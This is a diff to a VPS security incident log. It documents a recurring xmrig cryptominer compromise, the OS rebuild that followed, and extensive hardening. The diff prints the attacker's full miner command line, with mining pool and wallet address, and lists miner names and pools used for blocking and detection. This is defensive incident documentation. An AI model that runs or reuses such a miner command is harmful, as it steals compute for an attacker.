@@ -434,30 +434,58 @@ Only root with chattr -i can remove it
 
 ---
 
-## Incident #3 — VPS Offline / Not Responding (2026-04-14)
+## Incident #3 — Recurring Compromise (xmrig re-infection) + Full Rebuild (2026-04-14)
 
+### What happened
 - **Date:** 2026-04-14
-- **Symptom:** Site `https://snalattal.me` not loading; both ICMP ping and HTTPS connections to `72.60.132.3` timed out (100% packet loss).
-- **Diagnosis:** VPS instance itself is stopped at the Hostinger hypervisor level — not a Nginx/PM2/app issue. When the VPS process is stopped from outside the OS, the server cannot be reached at all (kernel is not running).
-- **Most likely cause:** Hostinger Monarx or their abuse team auto-stopped the VPS. Historically this has happened after Monarx detected suspicious activity (see Incident #1 and #2). Since malware was fully removed and cloud-init disabled, the trigger could also be: resource abuse detection, reboot policy, payment/plan issue, or a manual Hostinger intervention.
-- **Resolution Steps:**
-  1. Log in to Hostinger hPanel → VPS → `srv1290135`
-  2. Click **Start** (or **Restart** if state is "Stopped")
-  3. Check Monarx alerts page in hPanel — read the exact reason
-  4. SSH in: `ssh root@72.60.132.3` and run:
-     - `systemctl status nginx` — confirm Nginx is running
-     - `pm2 list` — confirm app (`sna-alattal`) is online
-     - `journalctl -xe --since "2 hours ago"` — look for shutdown reason
-     - `last -x | head -20` — check recent reboots/shutdowns
-     - `dmesg | tail -50` — kernel-level events before the stop
-  5. If Monarx flagged a file: do NOT quarantine — delete immediately
-  6. Update this incident entry with the confirmed root cause
-- **Prevention Going Forward:**
-  - **Uptime monitoring:** Set up external uptime check (UptimeRobot free tier) that pings `snalattal.me` every 5 minutes and emails/SMS on downtime → we learn about outages immediately, not from users
-  - **Hostinger alerts:** Enable email notifications for VPS state changes in hPanel
-  - **Monthly audit:** On the 1st of each month, SSH in and run `/usr/local/bin/health-check.sh` manually + review `/var/log/monarx/` for recent alerts
-  - **Document ANY Hostinger support ticket** in this file — their reasons for stopping the VPS are the strongest signal for what to harden next
-  - **Keep `SERVER-SECURITY.md` up to date** after every incident — future-me needs to know what was tried
+- **Initial symptom:** Site down. Hostinger hPanel showed the VPS was **rate-limited** (not stopped) due to CPU abuse.
+- **Root cause found in hPanel:** A process was running:
+  ```
+  ./https -a rx/0 -o pool.supportxmr.com:3333 -u 4AypWi9xNQvSy11FT5yr7Ajnyz2XuoUD7LGEJw4ZTRUHLrWjH1x5KoZUp9FTS4s9a5Y6Q7d4jSze4E6tq64aJTD2L7hnCrL -p ngintil -t 2
+  ```
+  — xmrig crypto miner, RandomX algorithm, Monero, pool `pool.supportxmr.com:3333`, worker name `ngintil` (disguised as nginx utility), binary renamed to `./https` to blend with HTTPS services. Using 250% CPU.
+- **Attacker's second move:** When we tried to SSH in with our existing keys (`id_ed25519` and `hostinger_sna`), both were **rejected**. The attacker had replaced `/root/.ssh/authorized_keys` with their own key (labeled `root@puppetserver`), locking us out.
+- **Implication:** The prior cleanups in Incidents #1 and #2 were not root-cause fixes. The attacker retained persistent access — likely via a second SSH key planted before or during our remediation — and reactivated the miner after the stakeout period.
+
+### Resolution — Full rebuild, not cleanup
+Since two in-place cleanups had failed, we chose a nuclear option: **reinstall the OS from scratch** via Hostinger hPanel with a fresh SSH key. A third in-place cleanup would have the same blind spots.
+
+Steps taken (all completed 2026-04-14):
+
+1. **Generated fresh ed25519 SSH key** (`~/.ssh/sna_alattal_new`) on the admin laptop.
+2. **hPanel → Operating System → Reinstall OS** with clean Ubuntu 24.04 LTS. New public key pasted during reinstall. All prior filesystem state (including any rootkit, persistence, hidden accounts) was wiped.
+3. **Verified clean state:** no xmrig, no suspicious files, no extra users, one known SSH key.
+4. **System prep:** apt update/upgrade, essentials, **2GB swap** (prevents OOM kills), timezone Asia/Riyadh.
+5. **Deleted `ubuntu` user** (UID 1000) — the entry point from Incident #1.
+6. **Disabled cloud-init** (the persistence mechanism from Incident #2). All four cloud-init services masked to `/dev/null` and symlinked so they can't be re-enabled by a template reinstall.
+7. **SSH hardening** (`/etc/ssh/sshd_config.d/99-hardening.conf`):
+   - PasswordAuthentication no
+   - PermitRootLogin prohibit-password
+   - MaxAuthTries 3, LoginGraceTime 30
+   - AllowUsers root (only)
+   - Modern ciphers only (chacha20, aes256-gcm); curve25519 KEX; ETM MACs
+8. **UFW firewall:** default deny inbound. Allow 80/443/9000. **Rate-limit 22/tcp** (UFW `limit` — auto-bans IPs with too many connection attempts).
+9. **Fail2Ban (aggressive):** sshd maxretry=3 bantime=7d; `recidive` jail bantime=4w for repeat offenders; nginx-http-auth, nginx-badbots, nginx-noscript jails.
+10. **Mining pool DNS blocks** in `/etc/hosts`: 15 pools including pool.supportxmr.com, minexmr, c3pool, moneroocean, hashvault, f2pool, nanopool. Even if malware lands, it can't reach its pool.
+11. **Kernel hardening** (`/etc/sysctl.d/99-security.conf`): rp_filter, SYN cookies, ignore ICMP redirects, `kernel.kptr_restrict=2`, `kernel.dmesg_restrict=1`, `fs.protected_hardlinks=1`.
+12. **`/tmp` mounted noexec,nosuid,nodev** via fstab.
+13. **Unattended-upgrades** enabled for security patches.
+14. **App stack:** Node.js 22 LTS, PM2 (fork mode, 768MB memory limit, 5 max restarts, 30s min uptime), Nginx 1.24 with rate limiting (30 r/s general, 10 r/s API, conn limit 20/IP) + strict security headers (HSTS preload, CSP, X-Frame-Options, Referrer-Policy).
+15. **SSL:** Let's Encrypt cert for `snalattal.me` + `www.snalattal.me`, auto-renewal via `certbot.timer` (enabled). TLS 1.3 with AES-256-GCM.
+16. **Auto-deploy webhook** (`/var/www/webhook/webhook.js`, systemd service `sna-webhook`) — HMAC-SHA256 verified, master-branch only. Secret stored in `/var/www/webhook/.secret` (chmod 600).
+17. **Self-healing cron** `*/2 * * * * /usr/local/bin/sna-health.sh` — checks app, nginx, fail2ban, memory, and scans for xmrig/minerd/cryptonight/supportxmr/c3pool/moneroocean patterns every 2 minutes. Kills suspicious PIDs and auto-restarts services.
+18. **PM2 logrotate** module installed; 50MB max per file, 7 retained, daily rotation.
+19. **PM2 resurrection** via `pm2-root.service` — app state persisted, restarts on reboot.
+
+### GitHub Webhook Secret (stored securely on server)
+`/var/www/webhook/.secret` — must be set in GitHub repo Settings → Webhooks as the secret for `http://72.60.132.3:9000/deploy`.
+
+### Prevention going forward
+- **External uptime monitor:** UptimeRobot (free) on `https://snalattal.me` every 5 min — alerts by email/SMS the moment the site drops.
+- **Monthly audit (1st of each month):** SSH in, run `/usr/local/bin/sna-health.sh`, check `/var/log/sna-health.log`, `/var/log/sna-deploy.log`, `fail2ban-client status`, `journalctl --since "30 days ago" | grep -i "fail\|error\|crit"`.
+- **If Hostinger rate-limits again:** do NOT click "Remove limitations" before identifying the CPU hog. Check `htop`, `/var/log/sna-health.log` for miner alerts, and `ps auxf --sort=-pcpu | head`.
+- **Quarterly SSH key rotation:** generate fresh ed25519, add to `authorized_keys`, remove old, verify login with new, remove old fully.
+- **Never allow PasswordAuthentication to be re-enabled** — this is what gave the attacker their initial foothold in Incident #1.
 
 ---
 
@@ -513,5 +541,5 @@ Decision tree:
 
 ---
 
-*Last updated: 2026-04-14 — added Incident #3 (VPS offline) + Outage Response Runbook*
+*Last updated: 2026-04-14 — Incident #3: xmrig re-infection + full OS rebuild + complete rehardening*
 *Maintained by: DevOps Team*
